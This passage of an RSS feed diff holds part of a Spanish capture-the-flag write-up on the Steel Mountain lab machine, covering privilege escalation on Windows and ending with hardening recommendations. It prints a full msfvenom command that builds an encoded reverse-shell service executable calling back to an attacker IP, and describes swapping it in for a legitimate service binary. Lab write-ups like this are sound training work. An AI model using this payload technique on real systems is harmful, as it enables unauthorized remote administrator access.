+<li>El servicio estaba configurado con permisos modificables, lo que permite a usuarios sin privilegios hacer cambios.</li>
+</ul>
+<div style="text-align: center;">
+  <img width="1000" src="/images/posts/steelmountain/image5.png" alt="script powerup" />
+</div>
+<center><em>Figura 5:</em> Uso de script PowerUp</center>
+<p>Creamos un payload de reverse shell con msfvenom usando el comando:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span> -e x86/shikata_ga_nai -f exe-service -o CleanupService.exe</span></span></code></pre></div><p>Este comando generó un ejecutable <code>CleanupService.exe</code> con un payload de revervse shell hacia nuestra máquina. Subimos este archivo al servidor, reemplazamos el ejecutable legítimo del servicio y lo reiniciamos con <code>sc stop</code> y <code>sc start</code>, ejecutando así nuestro payload y obteniendo acceso de administrador.</p>
+<div style="text-align: center;">
+  <img width="1000" src="/images/posts/steelmountain/image6.png" alt="ejecutable reemplazado" />
+</div>
+<center><em>Figura 6:</em> Ejecutable reemplazado</center>
+<p>Una vez dentro del sistema se consiguió la bandera final.</p>
+<div style="text-align: center;">
+  <img src="/images/posts/steelmountain/image7_1.png" alt="acceso a system" /><br>
+  <img src="/images/posts/steelmountain/image7_2.png" alt="bandera" />
+</div>
+<center><em>Figura 7:</em> Acceso a cuenta Administrador</center>
+<h2 id="herramientas-utilizadas">Herramientas utilizadas</h2>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Herramienta</th>
+          <th style="text-align: left">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">nmap</td>
+          <td style="text-align: left">Para el reconocimiento inicial y detección de servicios y puertos abiertos.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">metasploit</td>
+          <td style="text-align: left">Para lanzar el exploit contra el servidor Rejetto HTTP.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">PowerUp.ps1</td>
+          <td style="text-align: left">Script de PowerShell para analizar configuraciones de privilegios en sistemas Windows.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">msfvenom</td>
+          <td style="text-align: left">Para generar el payload de reverse shell que ejecutamos para obtener permisos de administrador.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="conclusión">Conclusión</h2>
+<p>Esta máquina era bastante vulnerable, con servicios web mal configurados y permisos inseguros en algunos servicios, lo que hizo relativamente fácil tanto el acceso inicial como la escalación de privilegios.</p>
+<h2 id="recomendaciones">Recomendaciones</h2>
+<p>Para mejorar la seguridad:</p>
+<ol>
+<li>Restringir el acceso a puertos no esenciales y limitar el acceso a IPs confiables.</li>
+<li>Actualizar o reemplazar el servidor Rejetto HTTP para cerrar posibles vulnerabilidades.</li>
+<li>Revisar y ajustar las configuraciones de servicios, asegurándose de que las rutas estén entre comillas y los permisos de modificación sean seguros.</li>
+<li>Implementar monitoreo y control de accesos en tiempo real para detectar cualquier actividad no autorizada en el sistema.</li>
+</ol>
+</div>
+]]></content:encoded>
+    </item>
+  </channel>
+</rss>
